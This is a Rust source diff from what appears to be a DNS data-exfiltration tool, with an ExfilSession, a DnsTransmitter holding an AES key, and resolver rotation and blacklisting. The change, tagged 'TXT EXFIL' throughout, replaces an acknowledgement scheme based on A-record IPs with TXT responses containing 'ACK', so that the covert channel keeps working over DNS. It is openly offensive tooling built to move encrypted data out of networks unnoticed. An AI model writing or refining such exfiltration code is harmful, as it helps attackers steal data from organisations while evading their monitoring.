@@ -8,7 +8,7 @@ use crate::metadata::ExfilSession;
 use crate::resolver::ResolverPool;
 use anyhow::{anyhow, Context, Result};
 use rand::Rng;
-use std::collections::{HashMap, HashSet};
+use std::collections::HashMap;
 use std::convert::TryInto;
 use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
 use std::time::{Duration, Instant};
@@ -33,7 +33,7 @@ pub struct DnsTransmitter {
     pool: ResolverPool,
     aes_key: [u8; 32],
     last_domain: Option<String>,
-    ack_next: HashSet<Ipv4Addr>,
+    // TXT EXFIL: ack_next removed - ACK is now text-based ("ACK" in TXT response)
     resolver_blacklist: HashMap<SocketAddr, Instant>,
     resolver_rejects: HashMap<SocketAddr, u32>,
 }
@@ -41,24 +41,13 @@ pub struct DnsTransmitter {
 impl DnsTransmitter {
     pub fn new(cfg: Config, pool: ResolverPool) -> Self {
         let aes_key = derive_key(&cfg.encryption_key);
-        let mut ack_next = HashSet::new();
-
-        for ip_str in cfg.server_ips() {
-            if let Ok(ip) = ip_str.parse::<Ipv4Addr>() {
-                ack_next.insert(increment_ip(ip));
-            }
-        }
-
-        if ack_next.is_empty() {
-            ack_next.insert(increment_ip(Ipv4Addr::new(127, 0, 0, 1)));
-        }
+        // TXT EXFIL: Removed IP-based ACK tracking - now uses TXT "ACK" response
 
         Self {
             cfg,
             pool,
             aes_key,
             last_domain: None,
-            ack_next,
             resolver_blacklist: HashMap::new(),
             resolver_rejects: HashMap::new(),
         }
@@ -155,7 +144,8 @@ impl DnsTransmitter {
         msg.set_message_type(MessageType::Query);
         msg.set_op_code(OpCode::Query);
         msg.set_recursion_desired(true);
-        msg.add_query(Query::query(name.clone(), RecordType::A));
+        // TXT EXFIL: Use TXT records instead of A records for acknowledgment
+        msg.add_query(Query::query(name.clone(), RecordType::TXT));
 
         let mut buf = Vec::with_capacity(512);
         let mut encoder = BinEncoder::new(&mut buf);
@@ -169,15 +159,23 @@ impl DnsTransmitter {
         let (size, _) = socket.recv_from(&mut resp_buf)?;
         let resp = Message::from_vec(&resp_buf[..size])?;
 
+        // TXT EXFIL: Check for "ACK" text in TXT response
         let ack = resp
             .answers()
             .iter()
             .find_map(|record| match record.data() {
-                Some(RData::A(ip)) => Some(ip.0),
+                Some(RData::TXT(txt)) => {
+                    let txt_data: String = txt.iter().map(|s| s.to_string()).collect();
+                    if txt_data == "ACK" {
+                        Some(true)
+                    } else {
+                        None
+                    }
+                }
                 _ => None,
             });
 
-        Ok(matches!(ack, Some(ip) if self.ack_next.contains(&ip)))
+        Ok(ack.unwrap_or(false))
     }
 
     fn build_name(&mut self, labels: &[String]) -> Result<Name> {
@@ -498,15 +496,4 @@ fn max_value_for_width(width: usize) -> u32 {
     36u32.saturating_pow(width as u32).saturating_sub(1)
 }
 
-fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
-    let mut octets = ip.octets();
-    for idx in (0..4).rev() {
-        if octets[idx] == 255 {
-            octets[idx] = 0;
-        } else {
-            octets[idx] += 1;
-            break;
-        }
-    }
-    Ipv4Addr::from(octets)
-}
+// TXT EXFIL: increment_ip removed - ACK is now text-based ("ACK" in TXT response)
